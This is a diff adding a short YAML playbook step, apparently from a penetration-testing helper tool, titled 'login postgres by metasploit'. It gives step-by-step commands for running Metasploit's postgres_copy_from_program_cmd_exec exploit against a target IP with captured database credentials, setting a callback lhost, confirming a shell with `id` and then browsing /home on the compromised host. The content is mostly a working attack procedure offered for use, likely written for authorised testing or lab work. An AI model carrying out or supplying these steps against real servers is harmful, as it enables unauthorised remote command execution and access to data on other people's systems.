@@ -1,0 +1,21 @@
+description: login postgres by metasploit 
+function: magic_function
+argument: []
+In: ['IP']
+condition:
+Out: []
+hint:
+  - "Did you get the username, password and name of database before?(y/N)"
+  - "[INPUT]username"
+  - "[INPUT]password"
+  - "[INPUT]database"
+  - open another terminal, and start metasploit by entering `sudo msfconsole`
+  - enter `use exploit/multi/postgres/postgres_copy_from_program_cmd_exec` there
+  - enter `set username {Data['username']}`
+  - enter `set password {Data['password']}`
+  - enter `set database {Data['database']}`
+  - enter `set rhosts {Data['IP']}`
+  - enter `set lhost {Data['myIP']}`
+  - enter `run`
+  - Is it successful?(y/N) (you can enter `id` to do further check)
+  - then let's explore the directories of this host. (eg. `ls -al /home`)
